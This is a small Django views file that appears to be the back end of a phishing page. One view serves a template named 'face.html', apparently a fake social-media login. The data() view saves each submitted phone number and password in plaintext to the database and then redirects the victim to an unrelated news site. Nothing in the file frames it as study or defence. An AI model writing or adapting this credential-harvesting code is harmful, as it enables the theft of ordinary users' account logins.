from django.shortcuts import render
from django.http import HttpResponse
from .models import app
from . import models
from django.http import HttpResponseRedirect

# Create your views here.


def gtech(request):
    return render(request, 'get/gtech.html')


def next(request):
    return render(request, 'get/face.html')


def login(request):
    if request.method == 'POST':
        return render(request, 'get/face.html')


def data(request):
    if request.method == 'POST':
        number = request.POST['number']
        password = request.POST['password']
        app = models.app.objects.create(number=number, password=password)
        app.save()
    return HttpResponseRedirect('Http://www.naijanews.com')

